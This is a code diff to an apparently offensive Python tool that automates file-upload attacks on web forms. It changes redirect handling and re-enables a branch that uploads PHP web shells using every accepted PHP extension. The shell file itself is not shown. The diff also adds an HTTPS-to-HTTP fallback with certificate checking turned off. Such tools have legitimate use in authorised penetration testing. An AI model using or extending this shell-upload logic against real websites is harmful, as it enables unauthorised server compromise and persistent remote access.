@@ -55,7 +55,7 @@ parser.add_argument("--timeout", action="store_true", dest="timeout", default=20
 parser.add_argument("--print-response", action="store_true", dest="print_response", default=False,help=f"If set, HTTP response will be printed on the screen\nUsage: {blue}--print-response{reset}")
 parser.add_argument("--status-codes", type=str, dest="status_codes", default="200",help=f"HTTP status codes which will be treated as acceptable, default 200\nUsage: {blue}--status-code 200,301{reset}")
 parser.add_argument("--protocol", type=str, dest="protocol", default="https",help=f"Connection protocol to be used for uploads, default https\nUsage: {blue}--status-code https{reset}")
-parser.add_argument("--disable-redirects", action="store_true", dest="disable_redirects", default="https",help=f"If enabled, disables forms from redirecting requests\nUsage: {blue}--disable-redirects{reset}")
+parser.add_argument("--enable-redirects", action="store_true", dest="enable_redirects", default=False,help=f"If enabled, allows forms to redirect the requests\nUsage: {blue}--enable-redirects{reset}")
 parser.add_argument("--manual-check", action="store_true", dest="manual_check", default=False,help=f"If enabled, pauses the execution after each successful shell upload\nUsage: {blue}--manual-check{reset}")
 parser.add_argument("--disable-modules", type=str, dest="disable_modules", default=False,help=f"Disables specified modules\nUsage: {blue}--disable-modules " + ",".join(variations.active_modules) + f"{reset}")
 
@@ -319,14 +319,14 @@ def upload(request_file, session, file_data, file_name, file_content_type, timeo
         multipart_data = pattern.sub(f'filename="{file_name}" \nContent-Type: {file_content_type}', data)
 
         try:
-            response = session.post(url, data=multipart_data, headers=headers,allow_redirects=(not options.disable_redirects), verify=True, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
+            response = session.post(url, data=multipart_data, headers=headers,allow_redirects=options.enable_redirects, verify=True, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
         except SSLError:
 
             url_http = url.replace('https://', 'http://')  # Change protocol to http
             variations.protocol = "http"
 
             warning(f"SSL error occurred. Switching to HTTP...")  
-            response = session.post(url_http, data=multipart_data, headers=headers, allow_redirects=(not options.disable_redirects), verify=False, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
+            response = session.post(url_http, data=multipart_data, headers=headers, allow_redirects=options.enable_redirects, verify=False, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
             
         if (response.status_code == 404):
             error(f"404 status on requested URL {url}")
@@ -415,7 +415,7 @@ def main():
         if (len(accepted_extensions) < 1 and len(accepted_php_extensions) < 1):
             error("No accepted extensions found")
 
-        if (False):
+        if (len(accepted_php_extensions) > 0):
             for accepted_php_extension in accepted_php_extensions:
                 info(f"Trying to upload .{accepted_php_extension} shell...")
                 with open(variations.shell_path, 'rb') as file: file_data = file.read()
